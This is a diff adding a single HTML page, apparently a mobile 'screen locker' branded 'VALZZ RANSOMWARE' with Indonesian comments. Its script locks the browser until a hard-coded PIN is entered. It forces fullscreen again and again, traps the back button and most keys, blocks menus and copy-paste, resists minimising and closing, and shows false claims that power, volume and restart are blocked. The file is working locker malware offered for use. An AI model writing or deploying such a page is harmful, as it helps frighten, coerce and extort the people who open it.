@@ -1,0 +1,527 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>🔒 LOCKED BY VALZZ</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+            -webkit-user-select: none;
+            user-select: none;
+        }
+        
+        html, body {
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            position: fixed;
+            background: #000;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+        
+        /* LAYAR KUNCIAN */
+        .lock-screen {
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(circle at 30% 40%, #a00000, #2a0000);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 15px;
+            position: fixed;
+            top: 0;
+            left: 0;
+            z-index: 99999;
+        }
+        
+        /* KARTU UTAMA */
+        .card {
+            width: 100%;
+            max-width: 380px;
+            background: #1f0000;
+            border: 5px solid #ff4444;
+            border-radius: 60px;
+            padding: 35px 25px;
+            box-shadow: 0 0 120px #ff0000;
+        }
+        
+        /* ICON */
+        .icon-big {
+            text-align: center;
+            font-size: 90px;
+            line-height: 1;
+            margin-bottom: 10px;
+            color: white;
+        }
+        
+        /* JUDUL */
+        h1 {
+            text-align: center;
+            color: white;
+            font-size: 52px;
+            font-weight: 900;
+            margin-bottom: 5px;
+            text-shadow: 0 0 25px red;
+            letter-spacing: 2px;
+        }
+        
+        .badge {
+            text-align: center;
+            color: #ffaaaa;
+            background: #330000;
+            padding: 8px 25px;
+            border-radius: 50px;
+            width: fit-content;
+            margin: 0 auto 25px;
+            font-weight: bold;
+            border: 2px solid #ff6666;
+            font-size: 16px;
+        }
+        
+        /* INFO PANEL */
+        .info-panel {
+            background: #150000;
+            border: 3px solid #cc0000;
+            border-radius: 30px;
+            padding: 20px 15px;
+            margin-bottom: 25px;
+        }
+        
+        .info-title {
+            color: #ffaaaa;
+            font-weight: bold;
+            text-align: center;
+            margin-bottom: 15px;
+            font-size: 20px;
+        }
+        
+        .info-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 10px 10px;
+            border-bottom: 1px solid #440000;
+            color: white;
+            font-size: 17px;
+        }
+        
+        .info-row:last-child {
+            border-bottom: none;
+        }
+        
+        .info-label {
+            color: #ffbbbb;
+        }
+        
+        .info-value {
+            color: #ff7777;
+            font-weight: bold;
+        }
+        
+        /* PIN AREA */
+        .pin-area {
+            margin-bottom: 25px;
+        }
+        
+        .pin-label {
+            color: #ffcccc;
+            margin-bottom: 10px;
+            font-weight: bold;
+            font-size: 16px;
+        }
+        
+        .pin-input {
+            width: 100%;
+            background: black;
+            border: 4px solid #ff4444;
+            border-radius: 60px;
+            padding: 20px 15px;
+            color: white;
+            font-size: 38px;
+            text-align: center;
+            letter-spacing: 12px;
+            font-family: monospace;
+            outline: none;
+        }
+        
+        .pin-input::placeholder {
+            color: #442222;
+            font-size: 18px;
+            letter-spacing: 2px;
+        }
+        
+        /* TOMBOL */
+        .btn-unlock {
+            width: 100%;
+            background: #cc0000;
+            border: none;
+            border-radius: 60px;
+            padding: 20px 0;
+            color: white;
+            font-weight: bold;
+            font-size: 28px;
+            text-transform: uppercase;
+            border: 3px solid #ffaaaa;
+            box-shadow: 0 6px 0 #550000;
+            margin-bottom: 15px;
+            cursor: pointer;
+        }
+        
+        .btn-unlock:active {
+            transform: translateY(5px);
+            box-shadow: 0 1px 0 #550000;
+        }
+        
+        .footer {
+            text-align: center;
+            color: #aa5555;
+            font-size: 13px;
+        }
+        
+        /* POPUP ERROR */
+        .error-popup {
+            position: fixed;
+            top: 30%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: black;
+            border: 4px solid red;
+            border-radius: 50px;
+            padding: 15px 35px;
+            color: red;
+            font-weight: bold;
+            font-size: 18px;
+            display: none;
+            z-index: 100000;
+            box-shadow: 0 0 50px red;
+        }
+        
+        /* LAYAR SUKSES */
+        .success-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #004d00;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 100001;
+        }
+        
+        .success-box {
+            background: #006600;
+            border: 6px solid #00ff00;
+            border-radius: 80px;
+            padding: 50px 40px;
+            text-align: center;
+            box-shadow: 0 0 200px #00ff00;
+        }
+        
+        .success-icon {
+            font-size: 100px;
+        }
+        
+        .success-title {
+            color: white;
+            font-size: 40px;
+            font-weight: bold;
+            margin: 15px 0 10px;
+        }
+        
+        .success-text {
+            color: #aaffaa;
+            font-size: 20px;
+        }
+        
+        /* LAYAR NORMAL SETELAH UNLOCK */
+        .normal-screen {
+            width: 100%;
+            height: 100%;
+            background: #f0f0f0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            font-family: Arial;
+            position: fixed;
+            top: 0;
+            left: 0;
+            z-index: 99998;
+        }
+        
+        .normal-text {
+            font-size: 28px;
+            color: #333;
+            margin-bottom: 30px;
+        }
+        
+        .normal-button {
+            background: #4CAF50;
+            color: white;
+            border: none;
+            padding: 15px 40px;
+            border-radius: 50px;
+            font-size: 20px;
+            cursor: pointer;
+        }
+        
+        .hidden {
+            display: none !important;
+        }
+    </style>
+</head>
+<body>
+    <!-- POPUP ERROR -->
+    <div class="error-popup" id="errorPopup">⚠️ PIN SALAH ⚠️</div>
+    
+    <!-- LAYAR KUNCIAN -->
+    <div class="lock-screen" id="lockScreen">
+        <div class="card">
+            <div class="icon-big">🔒💀🔒</div>
+            <h1>LOCKED</h1>
+            <div class="badge">VALZZ RANSOMWARE</div>
+            
+            <div class="info-panel">
+                <div class="info-title">⚠️ SUPER KETAT ⚠️</div>
+                <div class="info-row"><span class="info-label">BACK BUTTON</span><span class="info-value">BLOKIR TOTAL</span></div>
+                <div class="info-row"><span class="info-label">HOME BUTTON</span><span class="info-value">BLOKIR TOTAL</span></div>
+                <div class="info-row"><span class="info-label">POWER BUTTON</span><span class="info-value">BLOKIR TOTAL</span></div>
+                <div class="info-row"><span class="info-label">VOLUME</span><span class="info-value">BLOKIR TOTAL</span></div>
+                <div class="info-row"><span class="info-label">RESTART</span><span class="info-value">MASIH LOCK</span></div>
+            </div>
+            
+            <div class="pin-area">
+                <div class="pin-label">🔑 MASUKKAN PIN 6 DIGIT</div>
+                <input type="tel" id="pinInput" class="pin-input" maxlength="6" inputmode="numeric" placeholder="000000" autofocus>
+            </div>
+            
+            <button class="btn-unlock" onclick="checkPin()">UNLOCK</button>
+            <div class="footer">⚡ VALZZ SUPER KETAT ⚡</div>
+        </div>
+    </div>
+
+    <script>
+        // ============ KONFIGURASI ============
+        const MASTER_PIN = "123654"; // GANTI PIN DISINI
+        
+        // CEK APAKAH SUDAH PERNAH UNLOCK
+        if (localStorage.getItem('valzz_unlocked') === 'true') {
+            showNormalScreen();
+        } else {
+            startSuperLock();
+        }
+        
+        // ============ FUNGSI SUPER LOCK ============
+        function startSuperLock() {
+            console.log('🔒 SUPER KETAT AKTIF');
+            
+            let pinField = document.getElementById('pinInput');
+            
+            // 1. FOKUS INPUT TIAP 100ms
+            setInterval(() => {
+                pinField.focus();
+                pinField.click();
+            }, 100);
+            
+            // 2. FULLSCREEN PAKSA TIAP 500ms
+            function forceFullscreen() {
+                if (document.documentElement.requestFullscreen) {
+                    document.documentElement.requestFullscreen();
+                } else if (document.documentElement.webkitRequestFullscreen) {
+                    document.documentElement.webkitRequestFullscreen();
+                }
+            }
+            forceFullscreen();
+            setInterval(forceFullscreen, 500);
+            
+            // 3. BACK BUTTON BLOKIR TOTAL - PALING KERAS
+            history.pushState(null, null, location.href);
+            window.addEventListener('popstate', function() {
+                history.pushState(null, null, location.href);
+                showError('BACK DIBLOKIR!');
+            });
+            
+            // 4. ANDROID BACK BUTTON
+            document.addEventListener('backbutton', function(e) {
+                e.preventDefault();
+                e.stopPropagation();
+                showError('BACK TIDAK AKTIF');
+                return false;
+            }, false);
+            
+            // 5. SEMUA TOMBOL FISIK DIBLOKIR KECUALI ANGKA
+            document.addEventListener('keydown', function(e) {
+                // IZINKAN ANGKA, BACKSPACE, DELETE
+                if ((e.key >= '0' && e.key <= '9') || e.key === 'Backspace' || e.key === 'Delete') {
+                    return true;
+                }
+                
+                // BLOKIR SEMUA TOMBOL LAIN
+                e.preventDefault();
+                e.stopPropagation();
+                
+                // TAMPILKAN PESAN
+                if (e.key === 'Escape') showError('ESC DIBLOKIR');
+                if (e.key.includes('Volume')) showError('VOLUME DIBLOKIR');
+                if (e.key === 'Home') showError('HOME DIBLOKIR');
+                if (e.key === 'Power') showError('POWER DIBLOKIR');
+                
+                return false;
+            }, true);
+            
+            // 6. KEYUP JUGA DIBLOKIR
+            document.addEventListener('keyup', function(e) {
+                if (!((e.key >= '0' && e.key <= '9') || e.key === 'Backspace' || e.key === 'Delete')) {
+                    e.preventDefault();
+                    return false;
+                }
+            }, true);
+            
+            // 7. BLOKIR MENU KANAN
+            document.addEventListener('contextmenu', function(e) {
+                e.preventDefault();
+                showError('MENU DIBLOKIR');
+            });
+            
+            // 8. BLOKIR COPY PASTE
+            document.addEventListener('copy', function(e) { e.preventDefault(); });
+            document.addEventListener('paste', function(e) { e.preventDefault(); });
+            document.addEventListener('cut', function(e) { e.preventDefault(); });
+            
+            // 9. ANTI MINIMIZE / PINDAH APLIKASI
+            document.addEventListener('visibilitychange', function() {
+                if (document.hidden) {
+                    showError('TIDAK BISA KELUAR!');
+                    setTimeout(() => {
+                        window.focus();
+                        pinField.focus();
+                        forceFullscreen();
+                    }, 5);
+                }
+            });
+            
+            // 10. ANTI BLUR
+            window.addEventListener('blur', function() {
+                setTimeout(() => {
+                    window.focus();
+                    pinField.focus();
+                }, 5);
+            });
+            
+            // 11. ANTI CLOSE
+            window.onbeforeunload = function() {
+                return "⚠️ DEVICE TERKUNCI ⚠️";
+            };
+            
+            // 12. LOCK ORIENTASI
+            if (screen.orientation && screen.orientation.lock) {
+                screen.orientation.lock('portrait').catch(() => {});
+            }
+        }
+        
+        // ============ CEK PIN ============
+        function checkPin() {
+            let pin = document.getElementById('pinInput').value;
+            
+            if (pin === MASTER_PIN) {
+                // PIN BENAR
+                unlockSuccess();
+            } else {
+                // PIN SALAH
+                document.getElementById('pinInput').value = '';
+                
+                // EFEK GETER
+                document.querySelector('.card').style.transform = 'translateX(10px)';
+                setTimeout(() => document.querySelector('.card').style.transform = 'translateX(-10px)', 50);
+                setTimeout(() => document.querySelector('.card').style.transform = 'translateX(7px)', 100);
+                setTimeout(() => document.querySelector('.card').style.transform = 'translateX(-7px)', 150);
+                setTimeout(() => document.querySelector('.card').style.transform = 'translateX(4px)', 200);
+                setTimeout(() => document.querySelector('.card').style.transform = 'translateX(-4px)', 250);
+                setTimeout(() => document.querySelector('.card').style.transform = 'translateX(0)', 300);
+                
+                showError('PIN SALAH!');
+            }
+        }
+        
+        // ============ UNLOCK SUKSES ============
+        function unlockSuccess() {
+            // TAMPILKAN ANIMASI SUKSES
+            document.body.innerHTML += `
+                <div class="success-screen" id="successScreen">
+                    <div class="success-box">
+                        <div class="success-icon">✅</div>
+                        <div class="success-title">UNLOCKED</div>
+                        <div class="success-text">BACK BUTTON NORMAL</div>
+                    </div>
+                </div>
+            `;
+            
+            // SIMPAN STATUS UNLOCK
+            localStorage.setItem('valzz_unlocked', 'true');
+            
+            // HAPUS SEMUA EVENT LISTENER
+            window.onpopstate = null;
+            document.onkeydown = null;
+            document.onkeyup = null;
+            
+            // KELUAR DARI FULLSCREEN
+            if (document.exitFullscreen) {
+                document.exitFullscreen();
+            } else if (document.webkitExitFullscreen) {
+                document.webkitExitFullscreen();
+            }
+            
+            // TUNGGU 2 DETIK LALU TAMPILKAN LAYAR NORMAL
+            setTimeout(() => {
+                document.getElementById('lockScreen').remove();
+                document.getElementById('successScreen').remove();
+                showNormalScreen();
+            }, 2000);
+        }
+        
+        // ============ TAMPILKAN LAYAR NORMAL (BACK BUTTON NORMAL) ============
+        function showNormalScreen() {
+            // HAPUS SEMUA YANG ADA
+            document.body.innerHTML = '';
+            
+            // BUAT LAYAR NORMAL
+            let normalDiv = document.createElement('div');
+            normalDiv.className = 'normal-screen';
+            normalDiv.innerHTML = `
+                <div class="normal-text">✅ UNLOCKED SUCCESS</div>
+                <div class="normal-text" style="font-size: 18px;">BACK BUTTON SUDAH NORMAL</div>
+                <button class="normal-button" onclick="window.close()">TUTUP APLIKASI</button>
+            `;
+            
+            document.body.appendChild(normalDiv);
+            
+            // BACK BUTTON SUDAH NORMAL (TIDAK DIBLOKIR LAGI)
+            // KARENA SEMUA EVENT LISTENER SUDAH DIHAPUS
+        }
+        
+        // ============ TAMPILKAN ERROR ============
+        function showError(message) {
+            let popup = document.getElementById('errorPopup');
+            popup.style.display = 'block';
+            popup.innerHTML = '⚠️ ' + message + ' ⚠️';
+            
+            setTimeout(() => {
+                popup.style.display = 'none';
+            }, 1000);
+        }
+        
+        // ============ ENTER ============
+        document.getElementById('pinInput').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                checkPin();
+            }
+        });
+    </script>
+</body>
+</html>
